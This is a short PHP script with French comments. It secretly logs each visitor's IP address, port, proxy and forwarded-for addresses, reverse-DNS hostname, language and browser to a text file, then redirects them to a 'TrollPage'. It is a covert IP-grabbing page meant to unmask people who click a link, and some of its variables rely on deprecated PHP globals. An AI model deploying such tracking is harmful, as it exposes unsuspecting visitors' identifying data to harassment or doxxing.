<?php
$fichier        = "infos.txt";      // Nom du fichier de sortie
$fp             = fopen("$fichier", "a");      // Ouverture du fichier
$date           = date("d-m-Y");                
$heure          = date("H:i");
$fsz            = filesize("$fichier");
$ip_simple      = $_SERVER['REMOTE_ADDR'];     // IP du visiteur
$port           = $_SERVER['REMOTE_PORT'];     // Port du visiteur
$ipproxy        = $_SERVER['HTTP_VIA'];        // IP du proxy ( si il y a )
$url_provenance = $_SERVER['HTTP_REFERER'];    // Page ayant fait atterrir la
$langage        = $HTTP_ACCEPT_LANGUAGE;       // Langue du browser
$referer        = getenv("HTTP_USER_AGENT");   // User agent
$ip_derproxyb   = (getenv("HTTP_X_FORWARDED_FOR") ? getenv("HTTP_X_FORWARDED_FOR") : getenv("REMOTE_ADDR"));    // Recuperation de l'IP a travers le proxy
$fai_visiteur   = gethostbyaddr("$REMOTE_ADDR");     // FAI
fseek($fp, $fsz);
fputs($fp, "Date et heure : $date $heure\nAdresse IP + Port : $ip_simple:$port\nAdresse IP du Proxy : $ipproxy$ip_derproxyb\nDNS : $fai_visiteur \nLangue: $langage\nNaviguateur : $referer\n\n//\n\n");
Header("Location: ./TrollPage.html");
fclose($fp);
?>